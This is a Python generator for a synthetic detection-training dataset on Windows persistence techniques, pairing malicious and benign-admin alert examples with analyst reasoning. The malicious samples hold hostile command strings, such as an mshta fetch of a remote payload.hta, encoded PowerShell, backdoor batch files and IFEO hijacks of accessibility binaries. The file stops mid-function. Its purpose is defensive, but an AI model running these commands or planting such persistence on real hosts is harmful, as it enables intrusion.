"""
stage_persistence_behavioral.py -- Comprehensive Persistence TTP Behavioral Dataset

Detection philosophy: behavioral evidence only -- registry paths, event IDs,
API call sequences, file locations, process lineage. No tool names in detection
logic. Every class includes admin false-positive variants that teach the model
the exact discriminating factors.

Output:
  data/staging/persistence_behavioral_v1.jsonl
  data/staging/persistence_query_index.json

Usage:
    python stage_persistence_behavioral.py
    python stage_persistence_behavioral.py --records-per-class 15
    python stage_persistence_behavioral.py --tool-filter RegistryRunKey,WMISubscription
"""

import json
import random
import argparse
import logging
from pathlib import Path

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger("stage-persistence")
random.seed(7)

OUTPUT_DIR  = Path("../data/staging")
OUTPUT_FILE = OUTPUT_DIR / "persistence_behavioral_v1.jsonl"
INDEX_FILE  = OUTPUT_DIR / "persistence_query_index.json"

SYS = {
    "sysmon_sensor": (
        "You are the Host Forensics Expert. Target OS: Windows. "
        "Vector Space: 6D windows_math. Source: Sysmon event stream. "
        "Schema: sysmon_event_id, Image, CommandLine, ParentImage, User, IntegrityLevel, "
        "TargetImage, GrantedAccess, TargetObject, Details, ImageLoaded, Signed, "
        "PipeName, QueryName, TargetFilename. "
        "Identify persistence tradecraft. Output MITRE ATT&CK + containment recommendation."
    ),
    "windows_deepsensor": (
        "You are the Host Forensics Expert. Target OS: Windows. "
        "Vector Space: 6D windows_math. Schema: Image, CommandLine, ParentProcessName, "
        "RegistryPath, EventID, ServiceName. "
        "Identify persistence tradecraft. Output MITRE ATT&CK + containment recommendation."
    ),
    "linux_sentinel": (
        "You are the Host Forensics Expert. Target OS: Linux/Unix. "
        "Vector Space: 5D sentinel_math. Schema: comm, command_line, uid, file_path, syscall. "
        "Identify persistence tradecraft. Output MITRE ATT&CK + containment recommendation."
    ),
    "network_tap": (
        "You are the Network Tap Forensics Expert. Analyze the session window using "
        "pre-computed fields (port_class, JA3, cert metadata, is_internal_dst). "
        "Attribute to MITRE ATT&CK and recommend containment."
    ),
    "azure_entraid": (
        "You are the Cloud Identity Expert. Analyze Azure AD / Entra ID events. "
        "Identify persistence and privilege abuse. Output MITRE + containment."
    ),
    "macos_sensor": (
        "You are the Host Forensics Expert. Target OS: macOS. "
        "Schema: process_name, file_path, plist_path, code_signature, quarantine_flag. "
        "Identify persistence tradecraft. Output MITRE ATT&CK + containment recommendation."
    ),
}

VECTOR = {
    "sysmon_sensor":      "windows_math",
    "windows_deepsensor": "deepsensor_math",
    "linux_sentinel":     "sentinel_math",
    "network_tap":        "c2_math",
    "azure_entraid":      "cloud_flow",
    "macos_sensor":       "windows_math",
}

TTP_CAT = "Persistence"  # ttp_category field in every record

def _ip_int():  return f"10.{random.randint(0,10)}.{random.randint(1,254)}.{random.randint(1,254)}"
def _ip_ext():
    p = random.choice(["45.33","198.51","185.220","104.21","172.67","194.165"])
    return f"{p}.{random.randint(1,254)}.{random.randint(1,254)}"
def _host():    return f"{random.choice(['WS','SRV','DC','APP'])}-{random.randint(10,99)}"
def _user():    return random.choice(["jsmith","alee","tmorgan","schen","rbrown","lzhang"])
def _guid():    return f"{{{random.randint(10000000,99999999)-random.randint(1000,9999)}-{random.randint(1000,9999)}-{random.randint(1000,9999)}-{random.randint(100000000000,999999999999)}}}"
def _temppath(f): return random.choice([f"%TEMP%\\{f}", f"%APPDATA%\\{f}", f"C:\\Users\\Public\\{f}", f"C:\\ProgramData\\{f}"])

def _cot(a1, a2, a3, conclusion, technique, action="contain"):
    verdict = "TRUE POSITIVE" if action == "contain" else "FALSE POSITIVE"
    return (f"<analysis>\n[AXIS 1] Benign Alternative Assessment:\n  {a1}\n"
            f"[AXIS 2] Behavioral Proof Assessment:\n  {a2}\n"
            f"[AXIS 3] Entity Coverage:\n  {a3}\n"
            f"[CONCLUSION] {conclusion}\n</analysis>\n"
            f"{verdict}. {technique}\n"
            f"RECOMMENDED_ACTION: {action}")

TTP_CAT = "Persistence"

def _record(tool_class, sensor, mitre, msgs, cls, event_id=None):
    import hashlib
    r = {"ttp_category": TTP_CAT, "tool_class": tool_class,
         "mitre_techniques": mitre, "source_type": sensor,
         "vector_name": VECTOR[sensor], "classification": cls,
         "messages": msgs}
    if event_id is not None:
        r["event_id"] = event_id
    elif sensor in ("sysmon_sensor", "windows_deepsensor", "linux_sentinel", "macos_sensor"):
        r["event_id"] = hashlib.md5(f"{tool_class}_{cls}_{sensor}".encode()).hexdigest()[:16]
    return r

def _msg(sensor, user_text, asst_text):
    wrapped = (
        f"Spatial Anomaly Detected.\n"
        f"Source: {sensor}\n"
        f"Vector: <|spatial_vector|>\n"
        f"{user_text}"
    )
    return [{"role":"system","content":SYS[sensor]},
            {"role":"user","content":wrapped},
            {"role":"assistant","content":asst_text}]


# ═══════════════════════════════════════════════════════════════════════════════
# 1. RegistryRunKeyPersistence
#    Evidence: Sysmon 13 / Event 4657 write to Run/RunOnce/RunServices,
#              value data points to %TEMP%/%APPDATA%/non-vendor path,
#              unusual parent process making the write
#    Admin FP: Software installer writing to HKLM Run with signed binary
# ═══════════════════════════════════════════════════════════════════════════════

_RUN_KEYS = [
    r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
    r"HKLM\Software\Microsoft\Windows\CurrentVersion\Run",
    r"HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce",
    r"HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices",
]
_SUSPICIOUS_PARENTS = ["powershell.exe","wscript.exe","mshta.exe","WINWORD.EXE",
                       "cmd.exe","EXCEL.EXE","rundll32.exe","regsvr32.exe"]

def _rrk_tp(i):
    key  = random.choice(_RUN_KEYS)
    vname = random.choice(["svchost32","WindowsUpdate","MicrosoftEdge","SecurityHealth","OneDriveSync"])
    path = _temppath(random.choice(["svc32.exe","updater.exe","helper.bat","run.ps1"]))
    parent = random.choice(_SUSPICIOUS_PARENTS)
    p = {"host":_host(),"user":_user(),"key":key,"vname":vname,"vdata":path,
         "parent":parent,"signed":False,"event_id":random.choice([4657,"Sysmon-13"])}
    prompt = (f"Windows Host -- Registry Run Key Persistence.\n"
              f"Host: {p['host']}  User: {p['user']}\n"
              f"  EventID: {p['event_id']}\n"
              f"  RegistryKey: {p['key']}\n"
              f"  ValueName: {p['vname']}\n"
              f"  ValueData: {p['vdata']}\n"
              f"  WrittenBy: {p['parent']}  (unsigned_binary={not p['signed']})\n"
              f"  boot_persistence=YES  (survives reboot)")
    cot = _cot(
        f"Legitimate software that adds Run key entries does so from a signed installer "
        f"(msiexec, setup.exe) pointing to C:\\Program Files\\<Vendor>\\. "
        f"Parent process {p['parent']} is not an installer -- it is a script host or Office process.",
        f"Parent={p['parent']} (adversarial loader, not software installer). "
        f"ValueData='{p['vdata']}' (%TEMP%/%APPDATA% path = not a vendor installation directory). "
        f"unsigned_binary=True. Key={p['key']} (user/system-wide autorun). "
        "This combination -- script-host parent + temp path + unsigned binary -- has no legitimate software analog.",
        f"Host {p['host']} will execute the binary at {p['vdata']} on every login/boot. "
        "Persistence is established. Follow-on C2 activity expected.",
        "Registry Run key persistence confirmed.",
        f"MITRE T1547.001 (Boot/Logon Autostart: Registry Run Keys). "
        "Remove registry value, delete payload binary, isolate host.",
    )
    return prompt, cot, "true_positive"

def _rrk_fp(i):
    vendor = random.choice(["AdobeAcrobat","Zoom","Slack","Teams","Dropbox"])
    p = {"key": r"HKLM\Software\Microsoft\Windows\CurrentVersion\Run",
         "vname": vendor, "vdata": f"C:\\Program Files\\{vendor}\\{vendor.lower()}.exe",
         "parent": "msiexec.exe", "signed": True,
         "ticket": f"CHG-{random.randint(10000,99999)}"}
    prompt = (f"Windows Host -- Registry Run Key Write.\n"
              f"  RegistryKey: {p['key']}\n"
              f"  ValueName: {p['vname']}\n"
              f"  ValueData: {p['vdata']}\n"
              f"  WrittenBy: {p['parent']}  signed={p['signed']}\n"
              f"  change_ticket={p['ticket']}  deployment_source=SCCM")
    cot = _cot(
        f"msiexec writing to HKLM Run for a signed application in C:\\Program Files -- standard software installation.",
        f"parent=msiexec.exe (software installer). "
        f"ValueData=C:\\Program Files\\ (vendor installation path). "
        f"signed=True. Ticket {p['ticket']}. SCCM-deployed.",
        "Authorized software deployment -- no adversarial characteristics.",
        "Authorized software installer adding startup entry -- signed binary, standard path, change ticket.",
        "T1547.001 -- AUTHORIZED SOFTWARE INSTALL. No action.",
        action="dismiss",
    )
    return prompt, cot, "false_positive"


# ═══════════════════════════════════════════════════════════════════════════════
# 2. IFEODebuggerHijack
#    Evidence: Write to HKLM\...\Image File Execution Options\<target.exe>
#              Debugger value or SilentProcessExit\MonitorProcess set,
#              unexpected parent-child process relationship at runtime
#    Admin FP: Microsoft WinDbg Debugger attachment (temp, dev machine)
# ═══════════════════════════════════════════════════════════════════════════════

def _ifeo_tp(i):
    target  = random.choice(["taskmgr.exe","notepad.exe","calc.exe","mspaint.exe","sethc.exe","utilman.exe"])
    method  = random.choice(["Debugger","SilentProcessExit"])
    payload = _temppath("malicious.exe")
    p = {"host":_host(),"user":_user(),"target":target,"method":method,
         "payload":payload,"silent_exit":method=="SilentProcessExit"}
    if method == "Debugger":
        key = rf"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\{target}"
        val = f"Debugger = {payload}"
    else:
        key = rf"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\{target}"
        val = f"ReportingMode=1, MonitorProcess={payload}"
    prompt = (f"Windows Host -- IFEO / Debugger Hijack Persistence.\n"
              f"Host: {p['host']}  User: {p['user']}\n"
              f"  RegistryKey: {key}\n"
              f"  ValueSet: {val}\n"
              f"  target_executable: {p['target']}\n"
              f"  hijack_method: {p['method']}\n"
              f"  persistence_trigger: every invocation of {p['target']}")
    trigger_note = (f"Every time {target} is launched, payload runs first."
                    if method == "Debugger" else
                    f"When {target} exits, MonitorProcess payload executes with WerFault privilege.")
    cot = _cot(
        f"Debugger registry keys are used by developers with GFlags or WinDbg to attach a debugger "
        "to a process at startup. No production system should have a non-Microsoft debugger "
        f"entry for {target}. SilentProcessExit monitor entries serve no admin purpose.",
        f"IFEO key set for {target} → payload at {payload}. "
        f"{trigger_note} "
        f"Payload is in a non-standard path (TEMP/APPDATA). "
        "This technique specifically targets accessibility binaries (sethc.exe, utilman.exe) "
        "for pre-logon SYSTEM access.",
        f"Host {p['host']} will execute {payload} whenever {target} is invoked. "
        "If targeting accessibility binaries, attacker gains a shell at the login screen.",
        "IFEO debugger hijack persistence confirmed.",
        "MITRE T1546.012 (Event Triggered Execution: Image File Execution Options Injection). "
        "Remove IFEO registry key, delete payload binary.",
    )
    return prompt, cot, "true_positive"

def _ifeo_fp(i):
    target = "notepad.exe"
    debugger = r"C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\windbg.exe"
    p = {"key": rf"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\{target}",
         "val": f"Debugger = {debugger}", "machine": "DEV-WORKSTATION", "ticket": f"DEV-{random.randint(100,999)}"}
    prompt = (f"Windows Host -- IFEO Debugger Entry.\n"
              f"  Machine: {p['machine']}\n"
              f"  RegistryKey: {p['key']}\n"
              f"  ValueSet: {p['val']}\n"
              f"  machine_role=developer_workstation  change_ticket={p['ticket']}")
    cot = _cot(
        f"WinDbg in Windows Kits debugger path, developer workstation, approved dev ticket.",
        f"Debugger=C:\\Program Files (x86)\\Windows Kits\\... (official Microsoft SDK). "
        f"Machine is dev workstation. Ticket {p['ticket']}.",
        "Authorized developer debugging session. Not persistence -- will be removed after debugging.",
        "Authorized developer debugger attachment -- SDK path, dev machine, ticket.",
        "T1546.012 -- AUTHORIZED DEV DEBUGGER. Monitor for removal after debug session.",
        action="monitor",
    )
    return prompt, cot, "false_positive"


# ═══════════════════════════════════════════════════════════════════════════════
# 3. ScheduledTaskPersistence
#    Evidence: EventID 106/140 (Task Registered), action=PowerShell -enc / cmd.exe
#              with suspicious path, trigger=AtStartup/AtLogon, RunAs=SYSTEM
#    Admin FP: IT scheduled task with service account, documented action, ticket
# ═══════════════════════════════════════════════════════════════════════════════

def _stp_tp(i):
    triggers  = ["AtStartup","AtLogon","Daily (01:00)","OnEvent (EventID 4624)"]
    actions   = [
        "powershell.exe -EncodedCommand JABhAGIAYwA=",
        f"cmd.exe /c {_temppath('backdoor.bat')}",
        "wscript.exe C:\\ProgramData\\update.vbs",
        f"mshta.exe {_ip_ext()}/payload.hta",
    ]
    p = {"host":_host(),"user":_user(),
         "task_name":random.choice(["\\Microsoft\\Windows\\UpdateCheck",
                                    "\\SystemHealth","\\Google\\Update",
                                    "\\WinDefendAV","\\OneDriveCheck"]),
         "trigger":random.choice(triggers),"action":random.choice(actions),
         "run_level":"Highest","principal":"SYSTEM" if i%2==0 else _user(),
         "hidden":i%3!=0,"event_id":random.choice([106,140])}
    prompt = (f"Windows Host -- Scheduled Task Persistence.\n"
              f"Host: {p['host']}\n"
              f"  EventID: {p['event_id']} (Task Registered/Updated)\n"
              f"  TaskName: {p['task_name']}\n"
              f"  Trigger: {p['trigger']}\n"
              f"  Action: {p['action']}\n"
              f"  RunAs: {p['principal']}  RunLevel: {p['run_level']}\n"
              f"  Hidden: {p['hidden']}  xml_in_tasks_dir=YES")
    cot = _cot(
        "Legitimate scheduled tasks created by software installers use named binaries "
        "in C:\\Program Files\\, have descriptive names matching their vendor, and run "
        "under specific service accounts -- not SYSTEM for user-tier software.",
        f"TaskName mimics a system task (\\Microsoft\\Windows\\...) to blend in. "
        f"Action='{p['action'][:60]}' -- "
        + ("encoded PowerShell payload (obfuscation)." if "Encoded" in p['action'] else
           "script/HTA from non-standard path.")
        + f" Trigger={p['trigger']} (autorun). Principal={p['principal']}. "
        + f"Hidden={p['hidden']} (deliberately concealed from Task Scheduler UI).",
        f"Host {p['host']}: task will execute malicious action on every "
        f"{'boot' if 'Startup' in p['trigger'] else 'logon' if 'Logon' in p['trigger'] else 'schedule'}. "
        "Persistent foothold established.",
        "Scheduled task persistence confirmed -- spoofed system task name, malicious action.",
        "MITRE T1053.005 (Scheduled Task). Remove task, delete payload, isolate host.",
    )
    return prompt, cot, "true_positive"

def _stp_fp(i):
    p = {"task": r"\IT\WeeklyPatchScan", "action": r"C:\Program Files\Tenable\Nessus\nessus-agent.exe --scan",
         "principal": "svc-patchmgmt", "trigger": "Weekly (Sunday 02:00)",
         "ticket": f"CHG-{random.randint(10000,99999)}"}
    prompt = (f"Windows Host -- Scheduled Task Registration.\n"
              f"  TaskName: {p['task']}\n"
              f"  Action: {p['action']}\n"
              f"  RunAs: {p['principal']}  Trigger: {p['trigger']}\n"
              f"  change_ticket={p['ticket']}  hidden=NO  signed_binary=YES")
    cot = _cot(
        f"IT patch management task: service account, signed binary in Program Files, documented trigger, change ticket.",
        f"action=C:\\Program Files (vendor path). principal={p['principal']} (service account). "
        f"Hidden=NO. Ticket {p['ticket']}. Signed binary.",
        "Authorized IT maintenance task -- no evasion, no obfuscation.",
        "Authorized IT scheduled task -- service account, vendor path, change ticket.",
        "T1053.005 -- AUTHORIZED IT TASK. No action.",
        action="dismiss",
    )
    return prompt, cot, "false_positive"


# ═══════════════════════════════════════════════════════════════════════════════
# 4. StartupFolderLNK
#    Evidence: .lnk file creation in Startup path, hidden/minimized window style,
#              TargetPath in %TEMP%/%APPDATA%, unusual parent writing the file
#    Admin FP: Legitimate vendor app putting shortcut in startup (signed, std path)
# ═══════════════════════════════════════════════════════════════════════════════

_STARTUP_PATHS = [
    r"C:\Users\{user}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup",
    r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup",
]

def _sfl_tp(i):
    startup = random.choice(_STARTUP_PATHS)
    lnk_name = random.choice(["WindowsHelper.lnk","OneDriveUpdate.lnk","SysCheck.lnk","AdobeSync.lnk"])
    target   = _temppath(random.choice(["helper.exe","update.cmd","run.bat","svc.ps1"]))
    parent   = random.choice(_SUSPICIOUS_PARENTS)
    window   = random.choice([2, 7])  # 2=Hidden, 7=Minimized
    p = {"host":_host(),"user":_user(),"startup":startup,"lnk":lnk_name,
         "target":target,"parent":parent,"window":window,"signed":False}
    prompt = (f"Windows Host -- Startup Folder LNK Persistence.\n"
              f"Host: {p['host']}  User: {p['user']}\n"
              f"  FileCreated: {p['startup']}\\{p['lnk']}\n"
              f"  LNK_TargetPath: {p['target']}\n"
              f"  LNK_WindowStyle: {p['window']} ({'Hidden' if p['window']==2 else 'Minimized'})\n"
              f"  CreatedBy: {p['parent']}\n"
              f"  target_binary_signed: {p['signed']}\n"
              f"  boot_persistence: YES")
    cot = _cot(
        f"Software installers legitimately add shortcuts to Startup folders for user-facing "
        "applications. However, they write shortcuts pointing to C:\\Program Files\\<Vendor>\\ "
        "and use normal window styles (1=Normal), not Hidden or Minimized.",
        f"LNK target='{p['target']}' (non-vendor temp path). "
        f"WindowStyle={p['window']} ({'Hidden -- explicitly concealed from user' if p['window']==2 else 'Minimized -- avoiding user visibility'}). "
        f"CreatedBy={p['parent']} (not an installer process). "
        "unsigned_binary=True. File in startup path ensures execution on every logon.",
        f"Host {p['host']}: shortcut executes hidden payload at every user logon. "
        "If All Users startup path, affects every account on the machine.",
        "Startup folder LNK persistence confirmed -- hidden window + temp path + script-host parent.",
        "MITRE T1547.001 (Boot/Logon Autostart: Startup Folder). Remove LNK file, delete payload.",
    )
    return prompt, cot, "true_positive"

def _sfl_fp(i):
    p = {"lnk": "Slack.lnk",
         "target": r"C:\Program Files\Slack\slack.exe",
         "window": 1, "parent": "msiexec.exe", "signed": True}
    prompt = (f"Windows Host -- Startup Folder LNK Write.\n"
              f"  LNK_file: {p['lnk']}\n"
              f"  LNK_TargetPath: {p['target']}\n"
              f"  LNK_WindowStyle: {p['window']} (Normal)\n"
              f"  CreatedBy: {p['parent']}  signed=True\n"
              f"  vendor=Slack_Technologies")
    cot = _cot(
        "Signed software installer adding startup shortcut to C:\\Program Files location.",
        f"target=C:\\Program Files\\ (vendor path). WindowStyle=1 (Normal). msiexec parent. Signed.",
        "Authorized software startup shortcut -- vendor path, signed binary, normal window style.",
        "Authorized vendor startup shortcut -- standard installer, vendor path.",
        "T1547.001 -- AUTHORIZED SOFTWARE STARTUP ENTRY. No action.",
        action="dismiss",
    )
    return prompt, cot, "false_positive"


# ═══════════════════════════════════════════════════════════════════════════════
# 5. WindowsServiceInstall
#    Evidence: EventID 7045 (Service Installed), ImagePath in non-standard
#              location, auto-start, SYSTEM account, generic service name
#    Admin FP: IT deploying legitimate service with signed binary, admin ticket
# ═══════════════════════════════════════════════════════════════════════════════

def _wsi_tp(i):
    svc_names = ["WindowsHelperService","SysHealthSvc","AdobeSyncSvc","NetframeworkSvc",
                 "WmiProviderExtension","MicrosoftUpdateHelper"]
    image_paths = [
        _temppath("svc.exe"),
        rf"C:\Windows\Temp\{random.randint(1000,9999)}.exe",
        rf"C:\ProgramData\Microsoft\svchost.exe",
        rf"C:\Users\Public\{random.randint(100,999)}.exe",
    ]
    p = {"host":_host(),"svc":random.choice(svc_names),"path":random.choice(image_paths),
         "start":"AUTO_START","account":"LocalSystem","display":random.choice(svc_names),
         "signed":False}
    prompt = (f"Windows Host -- Service Installation (EventID 7045).\n"
              f"Host: {p['host']}\n"
              f"  ServiceName: {p['svc']}\n"
              f"  ImagePath: {p['path']}\n"
              f"  StartType: {p['start']} (survives reboot)\n"
              f"  ObjectName: {p['account']}\n"
              f"  binary_signed: {p['signed']}\n"
              f"  install_source: interactive_user_session")
    cot = _cot(
        "Legitimate service installations originate from signed installers and place "
        "service binaries in C:\\Program Files\\<Vendor>\\. AUTO_START services deployed "
        "outside of change management are anomalous.",
        f"ImagePath='{p['path']}' (%TEMP%/ProgramData non-vendor path). "
        f"binary_signed=False. "
        f"StartType=AUTO_START (runs on every boot). "
        f"ObjectName=LocalSystem (highest privilege). "
        "install_source=interactive_user_session (not an installer or deployment pipeline).",
        f"Host {p['host']}: persistent SYSTEM-privilege process established. "
        "Will survive reboots and user logoffs. C2 callback expected.",
        "Malicious Windows service installation confirmed.",
        "MITRE T1543.003 (Create or Modify System Process: Windows Service). "
        "Stop and delete service, remove binary, isolate host.",
    )
    return prompt, cot, "true_positive"

def _wsi_fp(i):
    p = {"svc": "TenableNessusAgent", "path": r"C:\Program Files\Tenable\Nessus\nessusd.exe",
         "start": "AUTO_START", "account": "NT AUTHORITY\\LocalService",
         "signed": True, "ticket": f"CHG-{random.randint(10000,99999)}"}
    prompt = (f"Windows Host -- Service Installation (EventID 7045).\n"
              f"  ServiceName: {p['svc']}\n"
              f"  ImagePath: {p['path']}\n"
              f"  StartType: {p['start']}  ObjectName: {p['account']}\n"
              f"  binary_signed={p['signed']}  change_ticket={p['ticket']}\n"
              f"  install_source=SCCM_deployment")
    cot = _cot(
        "Signed vendor binary in C:\\Program Files, LocalService account, SCCM deployment, change ticket.",
        f"path=C:\\Program Files\\ (vendor). signed=True. account=LocalService (limited). "
        f"SCCM install. Ticket {p['ticket']}.",
        "Authorized endpoint agent deployment -- signed binary, standard path, change ticket.",
        "Authorized service deployment -- signed, standard path, SCCM, ticket.",
        "T1543.003 -- AUTHORIZED SERVICE INSTALL. No action.",
        action="dismiss",
    )
    return prompt, cot, "false_positive"


# ═══════════════════════════════════════════════════════════════════════════════
# 6. WMIEventSubscription
#    Evidence: WMI EventFilter + EventConsumer + FilterToConsumerBinding created,
#              CommandLineEventConsumer references PowerShell or cmd,
#              EventFilter uses Win32_LocalTime or startup event
#    Admin FP: Documented IT monitoring WMI subscription (known vendor, scoped)
# ═══════════════════════════════════════════════════════════════════════════════

def _wmi_tp(i):
    consumer_types = [
        ("CommandLineEventConsumer", f"powershell.exe -enc {random.randint(10000,99999):x}"),
        ("CommandLineEventConsumer", f"cmd.exe /c {_temppath('backdoor.bat')}"),
        ("ActiveScriptEventConsumer", "VBScript execution of payload"),
    ]
    filters = [
        "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Minutes=0",
        "SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_Process'",
        "SELECT * FROM __EventGenerator WITHIN 30",
    ]
    consumer_type, command = consumer_types[i % len(consumer_types)]
    p = {"host":_host(),"filter":random.choice(filters),
         "consumer_type":consumer_type,"command":command,
         "binding_created":True,"namespace":"Root\\CIMv2",
         "wmi_event_ids":["5857","5858","5861"],
         "unsigned_payload":True}
    prompt = (f"Windows Host -- WMI Event Subscription Persistence.\n"
              f"Host: {p['host']}\n"
              f"  WMI Namespace: {p['namespace']}\n"
              f"  __EventFilter Query: {p['filter']}\n"
              f"  __EventConsumer Type: {p['consumer_type']}\n"
              f"  Consumer Command: {p['command']}\n"
              f"  __FilterToConsumerBinding: created=YES\n"
              f"  WMI Activity EventIDs: {', '.join(p['wmi_event_ids'])}\n"
              f"  persistence_trigger: automatic (no registry entry, fileless)")
    cot = _cot(
        "Legitimate WMI monitoring subscriptions used by vendor products (SCCM, Splunk Universal Forwarder) "
        "reference known binaries in C:\\Program Files\\ and are documented in the vendor's install guide. "
        "Ad-hoc subscriptions using PowerShell -enc or cmd.exe are not product behaviors.",
        f"Three-component WMI subscription pattern: EventFilter + {p['consumer_type']} + Binding. "
        f"Consumer command='{p['command'][:60]}' (encoded/obfuscated payload). "
        f"EventFilter triggers at regular interval (time-based or process-creation). "
        "This is a fileless persistence mechanism -- no registry Run key, no startup folder. "
        "WMI subscription objects persist in the CIM repository across reboots.",
        f"Host {p['host']}: WMI subscription will execute payload on every trigger event. "
        "Extremely stealthy -- standard persistence checkers may miss this unless they enumerate WMI consumers.",
        "WMI event subscription persistence confirmed -- fileless, survives reboot.",
        "MITRE T1546.003 (Event Triggered Execution: WMI Event Subscription). "
        "Remove subscription objects (Get-WMIObject __EventFilter/Consumer/Binding | Remove-WmiObject).",
    )
    return prompt, cot, "true_positive"

def _wmi_fp(i):
    p = {"filter": "SELECT * FROM __InstanceModificationEvent WITHIN 30 WHERE TargetInstance ISA 'Win32_Service'",
         "consumer": "CommandLineEventConsumer",
         "command": r"C:\Program Files\Splunk\bin\splunkd.exe restart",
         "vendor": "Splunk", "signed": True}
    prompt = (f"Windows Host -- WMI Event Subscription Detected.\n"
              f"  EventFilter: {p['filter']}\n"
              f"  Consumer: {p['consumer']}\n"
              f"  Command: {p['command']}\n"
              f"  vendor={p['vendor']}  signed={p['signed']}  documented_in_install_guide=YES")
    cot = _cot(
        "Splunk agent WMI subscription for service restart monitoring -- documented, signed binary, vendor install.",
        f"command=C:\\Program Files\\Splunk\\ (vendor path). Signed. Documented Splunk behavior.",
        "Authorized vendor monitoring subscription -- documented in Splunk admin guide.",
        "Authorized vendor WMI subscription -- Splunk service monitoring.",
        "T1546.003 -- AUTHORIZED VENDOR SUBSCRIPTION. No action.",
        action="dismiss",
    )
    return prompt, cot, "false_positive"


# ═══════════════════════════════════════════════════════════════════════════════
# 7. DLLSideloading
#    Evidence: Sysmon Event 7 (DLL loaded) from non-System32 path by legitimate
#              binary, VEH hook registration, DLL exports match legitimate DLL
#              (forwarding), process making unexpected network connections
#    Admin FP: Legitimate vendor app bundling its own DLL (documented, signed)
# ═══════════════════════════════════════════════════════════════════════════════

def _dllsl_tp(i):
    apps   = ["OneDrive.exe","Teams.exe","slack.exe","zoom.exe","SearchApp.exe"]
    dlls   = ["version.dll","dbghelp.dll","winmm.dll","cryptbase.dll","profapi.dll"]
    app    = random.choice(apps)
    dll    = random.choice(dlls)
    dll_dir= random.choice([f"C:\\Users\\{_user()}\\AppData\\Local\\{app.split('.')[0]}",
                             f"C:\\Users\\Public\\{app.split('.')[0]}"])
    p = {"host":_host(),"app":app,"dll":dll,"dll_path":f"{dll_dir}\\{dll}",
         "signed":False,"forwarding_all_exports":True,
         "veh_hook":i%2==0,"network_conn":_ip_ext(),
         "search_order":"application_dir_before_system32"}
    prompt = (f"Windows Host -- DLL Sideloading (Sysmon Event 7).\n"
              f"Host: {p['host']}\n"
              f"  LoadingProcess: {p['app']}\n"
              f"  DLL_Loaded: {p['dll']}\n"
              f"  DLL_Path: {p['dll_path']}  (expected: C:\\Windows\\System32\\{p['dll']})\n"
              f"  dll_signed: {p['signed']}\n"
              f"  dll_exports_forward_to_legitimate=YES\n"
              f"  veh_hook_registered={'YES (Vectored Exception Handler on CreateWindowExW)' if p['veh_hook'] else 'NO'}\n"
              f"  subsequent_network_connection: {p['network_conn']}\n"
              f"  search_order: DLL found in application dir before System32")
    cot = _cot(
        f"Windows DLL search order places the application directory before System32. "
        f"Legitimate {app} does not ship a {dll} in its install directory -- "
        f"it relies on the system-provided one. A {dll} appearing in a non-system path alongside {app} "
        "is an adversarial plant.",
        f"DLL loaded from '{p['dll_path']}' instead of System32 -- hijacks search order. "
        f"unsigned_dll=True (system {dll} is always signed by Microsoft). "
        f"Exports forward to legitimate {dll} (masquerades as real DLL). "
        + (f"VEH hook on CreateWindowExW registered -- function hijacking for code execution. " if p['veh_hook'] else "")
        + f"Subsequent outbound connection to {p['network_conn']} -- C2 callback via legitimate process.",
        f"Host {p['host']}: {app} is executing malicious code within its process context. "
        "Network connections from this process appear legitimate. "
        "Persistence survives until DLL is removed from application directory.",
        "DLL sideloading via search-order hijacking confirmed.",
        "MITRE T1574.002 (Hijack Execution Flow: DLL Side-Loading). "
        "Remove malicious DLL from app directory, block outbound connection.",
    )
    return prompt, cot, "true_positive"

def _dllsl_fp(i):
    p = {"app":"AutoCAD.exe","dll":"acadres.dll",
         "path":r"C:\Program Files\Autodesk\AutoCAD 2024\acadres.dll","signed":True}
    prompt = (f"Windows Host -- DLL Load in Application Directory.\n"
              f"  LoadingProcess: {p['app']}\n"
              f"  DLL_Path: {p['path']}\n"
              f"  dll_signed={p['signed']}  vendor=Autodesk\n"
              f"  documented_in_install_manifest=YES")
    cot = _cot(
        "AutoCAD ships its own resource DLL in its install directory -- documented, signed by Autodesk.",
        f"path=C:\\Program Files\\Autodesk\\ (vendor dir). Signed by Autodesk. Documented in install manifest.",
        "Authorized vendor DLL in application directory -- no hijack characteristics.",
        "Authorized vendor DLL bundling -- signed, documented, vendor path.",
        "T1574.002 -- AUTHORIZED VENDOR DLL. No action.",
        action="dismiss",
    )
    return prompt, cot, "false_positive"


# ═══════════════════════════════════════════════════════════════════════════════
# 8. GPOAbuse
#    Evidence: LDAP modify on gplink or gPCFileSysPath attribute,
#              SMB write to SYSVOL share, new ScheduledTask XML in Policies,
#              policy replication to domain-joined machines
#    Admin FP: Domain admin making authorized GPO change with IT ticket
# ═══════════════════════════════════════════════════════════════════════════════

def _gpo_tp(i):
    p = {"src":_ip_int(),"dc":_ip_int(),"user":_user(),
         "gpo_guid":_guid(),
         "ldap_mod_attrs":["gPCMachineExtensionNames","gPCFileSysPath","gplink"],
         "sysvol_write":True,"task_xml_written":True,
         "targets":random.randint(10,500),
         "task_action":f"powershell.exe -enc {random.randint(100000,999999):x}"}
    prompt = (f"Cloud/Network + Windows -- GPO Abuse for Domain-Wide Persistence.\n"
              f"Source: {p['src']} ({p['user']}) → DC: {p['dc']}\n"
              f"  LDAP_Modified_Attributes: {', '.join(p['ldap_mod_attrs'])}\n"
              f"  GPO_GUID: {p['gpo_guid']}\n"
              f"  SYSVOL_write: {p['sysvol_write']} → \\\\DC\\SYSVOL\\Policies\\{p['gpo_guid']}\\Machine\\Preferences\\ScheduledTasks\\\n"
              f"  Scheduled_Task_injected: {p['task_xml_written']}\n"
              f"  Task_Action: {p['task_action']}\n"
              f"  estimated_affected_machines: {p['targets']}\n"
              f"  policy_replication: automatic (Group Policy engine)")
    cot = _cot(
        f"Legitimate GPO modifications are performed by domain admins with change tickets, "
